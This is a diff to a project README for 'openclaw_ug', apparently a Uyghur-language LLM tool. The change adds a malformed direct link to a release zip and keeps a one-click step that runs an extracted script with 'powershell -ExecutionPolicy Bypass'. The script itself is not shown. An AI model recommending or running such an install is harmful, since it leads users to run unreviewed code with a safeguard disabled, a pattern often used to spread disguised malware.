@@ -4,7 +4,7 @@
    Built on [OpenClaw](https://github.com/openclaw/openclaw), providing a truly native Uyghur language LLM experience.
 
 ## News
-After extensive testing and feedback, openclaw_ug now stable and reliable! The code has been released in [Release]([https://github.com/TaresaPerre/openclaw-ug/releases/]). Please download and install it. After extracting the folder, use the following command for one-click installation:
+After extensive testing and feedback, openclaw_ug now stable and reliable! The code has been released in Release [Click here](https://github.com/TaresaPerre/openclaw-ug/releases/](https://github.com/TaresaPerre/openclaw-ug/releases/download/v2026.4.15/openclaw_ug_v2026.4.15.zip)). Please download and install it. After extracting the folder, use the following command for one-click installation:
 ```powershell
 powershell -ExecutionPolicy Bypass -File openclaw-install.ps1
 ```
